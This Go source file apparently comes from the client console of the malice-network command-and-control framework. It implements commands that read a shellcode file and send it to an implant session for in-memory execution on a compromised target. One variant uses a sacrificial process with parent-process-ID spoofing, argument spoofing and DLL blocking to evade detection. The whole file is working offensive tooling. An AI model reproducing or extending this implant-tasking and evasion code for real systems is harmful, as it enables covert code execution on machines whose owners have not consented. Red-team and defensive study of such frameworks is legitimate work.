package exec

import (
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
	"os"
	"path/filepath"
)

// ExecuteShellcodeCmd - Execute shellcode in-memory
func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.Console) {
	path := cmd.Flags().Arg(0)
	params := cmd.Flags().Args()[1:]
	ppid, _ := cmd.Flags().GetUint("ppid")
	processname, _ := cmd.Flags().GetString("process")
	argue, _ := cmd.Flags().GetString("argue")
	isBlockDll, _ := cmd.Flags().GetBool("block_dll")
	shellcodeBin, err := os.ReadFile(path)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	execShellcode(path, shellcodeBin, params, int(ppid), processname, argue, isBlockDll, con)
}

func execShellcode(shellcodePath string, shellcodeBin []byte, paramString []string, ppid int, processname string,
	argue string, isBlockDll bool, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(shellcodePath),
		Bin:    shellcodeBin,
		Type:   consts.ModuleExecuteShellcode,
		Output: true,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   append([]string{processname}, paramString...),
		},
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}

func InlineShellcodeCmd(cmd *cobra.Command, con *console.Console) {
	path := cmd.Flags().Arg(0)
	data, err := os.ReadFile(path)
	if err != nil {
		console.Log.Errorf("Error reading file: %v", err)
		return
	}
	inlineShellcode(path, data, con)
}

func inlineShellcode(path string, data []byte, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(path),
		Bin:    data,
		Type:   consts.ModuleExecuteShellcode,
		Output: true,
	})
	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}
	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}
